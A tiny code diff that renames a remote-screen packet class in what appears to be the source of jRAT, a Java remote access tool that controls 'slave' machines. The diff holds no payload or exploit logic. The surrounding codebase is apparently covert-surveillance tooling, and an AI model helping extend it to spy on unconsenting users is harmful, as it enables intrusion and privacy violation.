@@ -8,7 +8,7 @@ import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.FrameRemoteScreen;
 import se.jrat.common.utils.ImageUtils;
 
-public class Packet17RemoteScreen extends AbstractIncomingPacket {
+public class Packet26RemoteScreen extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
